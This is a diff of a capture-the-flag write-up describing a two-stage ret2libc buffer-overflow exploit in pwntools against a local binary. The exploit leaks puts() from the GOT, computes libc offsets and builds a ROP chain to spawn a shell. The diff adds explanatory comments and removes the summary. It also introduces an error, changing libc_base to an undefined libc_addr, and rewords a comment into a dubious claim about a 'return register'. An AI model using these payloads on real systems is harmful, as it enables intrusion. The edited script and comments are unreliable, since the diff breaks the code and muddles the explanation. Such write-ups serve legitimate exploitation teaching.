@@ -116,6 +116,10 @@ ROPgadget --binary ./shellcode | grep "pop rdi"
 - **pop rdi; ret** → Allows control over the `rdi` register (1st argument to functions).  
 - **ret** → Used for stack alignment.  
 
+The first argument to a function is passed in the rdi register. For example:
+To call puts("Hello"), the address of the string "Hello" must be placed in rdi.
+To call system("/bin/sh"), the address of the string "/bin/sh" must be placed in rdi.
+
 To call `system("/bin/sh")`, we need:  
 1. `pop rdi; ret` → Load `/bin/sh` into `rdi`  
 2. `ret` (optional for alignment)  
@@ -133,18 +137,17 @@ elf = context.binary = ELF('./shellcode')
 libc = ELF('./libc-2.23.so')
 p = process('./shellcode')
 
-# Address to prevent crashes (mov eax, 0x0)
+# Address to overwrite return register (mov eax, 0x0)
 add = 0x400600  
 
 # Receive initial output
 p.recv()
 
-# === Stage 1: Leak puts() address ===
 payload = b'A' * 47        # Padding (47 A's)  
 payload += b'F'            # Marker for reference  
 payload += p64(add)        # Overwrite return address  
 payload += 16 * b'b'       # Extra padding  
-payload += p64(0x400793)   # pop rdi; ret  
+payload += p64(0x400793)   # pop rdi; ret gadget pops the next value in the stack (puts's GOT) into rdi, and return (plt.puts) which calls puts(puts@got) and prints the puts address
 payload += p64(elf.got.puts)  # Address of puts() in GOT  
 payload += p64(elf.plt.puts)  # Call puts()  
 payload += p64(0x400616)   # Return to main()  
@@ -159,14 +162,13 @@ puts_addr = u64(output.ljust(8, b""))
 # Calculate addresses
 libc_base = puts_addr - 0x6f6a0  
 system_addr = libc_base + 0x453a0  
-bin_sh = libc_base + 0x18ce67  
+bin_sh = libc_addr + 0x18ce67
 
-# === Stage 2: Exploit buffer overflow to get shell ===
 payload2 = b'C' * 48        # Padding  
 payload2 += p64(add)        # Overwrite return address  
 payload2 += 16 * b'b'       # Extra padding  
 payload2 += p64(0x4004a9)   # ret (stack alignment)  
-payload2 += p64(0x400793)   # pop rdi; ret  
+payload2 += p64(0x400793)   # pop rdi; ret gadget pops next value (bin_sh) into rdi and returns this instruction to the next address in the stack (system_addr) calling system("/bin/sh") 
 payload2 += p64(bin_sh)     # Address of "/bin/sh"  
 payload2 += p64(system_addr)  # Call system("/bin/sh")  
 
@@ -191,17 +193,4 @@ p.interactive()
    - Calls `system("/bin/sh")` to spawn a shell.  
 
 ### Successfully Getting the Flag  
-![flag](flag.png)  
-
----
-
-## Summary  
-
-- **Vulnerability:** Buffer Overflow  
-- **Goal:** Call `system("/bin/sh")`  
-- **Method:**  
-  1. Leak **puts()** address from GOT.  
-  2. Compute **libc base address**.  
-  3. Find **system()** and `"/bin/sh"` offsets.  
-  4. Construct **ROP chain** to call `system("/bin/sh")`.  
-  5. **Exploit buffer overflow** to execute the attack.  
+![flag](flag.png) 
